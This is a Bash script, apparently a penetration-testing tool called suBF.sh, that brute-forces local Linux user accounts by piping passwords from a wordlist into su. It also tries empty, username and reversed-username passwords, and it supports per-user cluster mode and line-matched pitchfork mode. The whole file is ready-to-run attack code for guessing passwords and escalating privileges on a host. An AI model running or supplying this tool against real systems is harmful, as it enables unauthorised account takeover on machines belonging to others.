#!/bin/bash

help="This tool bruteforces users using binary su with passwords from a wordlist.

OPTIONS:
  -u <username>       Single username to bruteforce
  -U <userlist>       File containing list of usernames (one per line)
  -w <wordlist>       Password wordlist (default: top12000.txt)
  -t <timeout>        Timeout for each su process (default: 0.7)
  -s <sleep>          Sleep between su processes (default: 0.007)
  --no-bruteforce     Pitchfork mode: match username line N with password line N
                      (default is cluster mode: try each user with each password)
  -h                  Show this help

ATTACK MODES:
  Cluster (default):  Each username is tried with every password in the wordlist
  Pitchfork:          Username from line 1 with password from line 1, etc.
                      (requires -U userlist and -w wordlist with equal line counts)

EXAMPLES:
  ./suBF.sh -u root -w passwords.txt                    # Single user, cluster
  ./suBF.sh -U users.txt -w passwords.txt               # Multi user, cluster
  ./suBF.sh -U users.txt -w passwords.txt --no-bruteforce  # Pitchfork mode

THE USERNAME IS CASE SENSITIVE AND THIS SCRIPT DOES NOT CHECK IF THE PROVIDED USERNAME EXISTS\n\n"

WORDLIST="top12000.txt"
USER=""
USERLIST=""
TIMEOUTPROC="0.7"
SLEEPPROC="0.007"
PITCHFORK=0

# Parse long options first
for arg in "$@"; do
  case "$arg" in
    --no-bruteforce) PITCHFORK=1;;
  esac
done

# Filter out long options for getopts
ARGS=$(echo "$@" | sed 's/--no-bruteforce//g')

while getopts "h?u:U:t:s:w:" opt $ARGS; do
  case "$opt" in
    h|\?) printf "$help"; exit 0;;
    u)  USER=$OPTARG;;
    U)  USERLIST=$OPTARG;;
    t)  TIMEOUTPROC=$OPTARG;;
    s)  SLEEPPROC=$OPTARG;;
    w)  WORDLIST=$OPTARG;;
  esac
done

# Validate inputs
if ! [ "$USER" ] && ! [ "$USERLIST" ]; then printf "$help"; exit 0; fi

if [ "$USERLIST" ] && ! [ -f "$USERLIST" ]; then echo "Userlist ($USERLIST) not found!"; exit 1; fi

if ! [[ -p /dev/stdin ]] && ! [ "$WORDLIST" = "-" ] && ! [ -f "$WORDLIST" ]; then echo "Wordlist ($WORDLIST) not found!"; exit 1; fi

if [ $PITCHFORK -eq 1 ]; then
  if ! [ "$USERLIST" ]; then
    echo "Pitchfork mode requires a userlist (-U)"; exit 1
  fi
  if [[ -p /dev/stdin ]] || [ "$WORDLIST" = "-" ]; then
    echo "Pitchfork mode does not support reading passwords from stdin"; exit 1
  fi
fi

C=$(printf '\033')

su_try_pwd (){
  USER=$1
  PASSWORDTRY=$2
  trysu=`echo "$PASSWORDTRY" | timeout $TIMEOUTPROC su $USER -c whoami 2>/dev/null` 
  if [ "$trysu" ]; then
    echo "  You can login as $USER using password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
    exit 0;
  fi
}

# Cluster mode: bruteforce a single user with all passwords
su_brute_user_cluster (){
  echo "  [+] Bruteforcing $1..."
  local TARGET_USER=$1
  su_try_pwd $TARGET_USER "" &    #Try without password
  su_try_pwd $TARGET_USER $TARGET_USER & #Try username as password
  su_try_pwd $TARGET_USER `echo $TARGET_USER | rev 2>/dev/null` &     #Try reverse username as password

  if ! [[ -p /dev/stdin ]] && [ -f "$WORDLIST" ]; then
    while IFS='' read -r P || [ -n "${P}" ]; do # Loop through wordlist file
      su_try_pwd $TARGET_USER $P & #Try TOP TRIES of passwords (by default 2000)
      sleep $SLEEPPROC # To not overload the system
    done < $WORDLIST

  else
    cat - | while read line; do
      su_try_pwd $TARGET_USER $line & #Try TOP TRIES of passwords (by default 2000)
      sleep $SLEEPPROC # To not overload the system
    done
  fi
  wait
}

# Pitchfork mode: match line N of userlist with line N of wordlist
su_brute_pitchfork (){
  echo "  [+] Pitchfork mode: matching userlist lines with wordlist lines..."

  local user_count=$(wc -l < "$USERLIST")
  local pass_count=$(wc -l < "$WORDLIST")

  if [ "$user_count" -ne "$pass_count" ]; then
    echo "  [!] Warning: Userlist has $user_count lines, wordlist has $pass_count lines"
    echo "  [!] Will process until the shorter list is exhausted"
  fi

  exec 3< "$USERLIST"
  exec 4< "$WORDLIST"

  while IFS='' read -r TARGET_USER <&3 && IFS='' read -r P <&4; do
    if [ -n "$TARGET_USER" ] && [ -n "$P" ]; then
      echo "  [*] Trying $TARGET_USER:$P"
      su_try_pwd $TARGET_USER $P &
      sleep $SLEEPPROC
    fi
  done

  exec 3<&-
  exec 4<&-
  wait
}

# Main execution logic
if [ $PITCHFORK -eq 1 ]; then
  # Pitchfork mode
  su_brute_pitchfork
else
  # Cluster mode
  if [ "$USERLIST" ]; then
    # Multiple users from file
    while IFS='' read -r TARGET_USER || [ -n "$TARGET_USER" ]; do
      if [ -n "$TARGET_USER" ]; then
        su_brute_user_cluster "$TARGET_USER"
      fi
    done < "$USERLIST"
  else
    # Single user
    su_brute_user_cluster "$USER"
  fi
fi

echo "  Attack completed" | sed "s,.*,${C}[1;31;107m&${C}[0m,"
